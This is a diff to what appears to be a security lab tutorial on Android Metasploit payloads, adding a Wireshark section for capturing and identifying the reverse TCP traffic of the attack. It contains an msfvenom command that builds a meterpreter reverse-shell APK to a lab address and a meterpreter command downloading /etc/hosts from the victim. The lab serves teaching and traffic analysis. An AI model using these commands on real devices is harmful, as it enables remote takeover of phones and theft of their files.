@@ -42,14 +42,14 @@ $ ifconfig
 `````
 
 
-## Explore Metasploits [^ex]
+## Explore Metasploits 
 
 ```
 $ msfconsole
 msf >  search type:payload platform:android
 ```
 
-Create a reversed TCP
+Create a reversed TCP [^ex]
 
 ```
 msf > msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f raw -o reverse_tcp.apk
@@ -144,3 +144,20 @@ meterpreter > download /etc/hosts
 ```
 
 
+## Monitor Traffic
+
+Launch `Wireshark` with root privilege:
+
+```
+$ sudo wireshark
+```
+
+When starting `exploit` in [Explore Metasploits](#explore-metasploits), `Wireshark` captures the TCP traffic between the attacker and the victim. For example, here is the packets that the reversed TCP connection establishes (Note that `10.0.2.15:4444` is the malicious host):
+
+![](./establish.png)
+
+We dump the captured traffic into an `.pcap` file, which can be opened with `wireshark`. for example:
+
+{download}`sample.pcap`
+
+which records all network traffic during the attack, try to distinguish which traffics are related to the attack process.
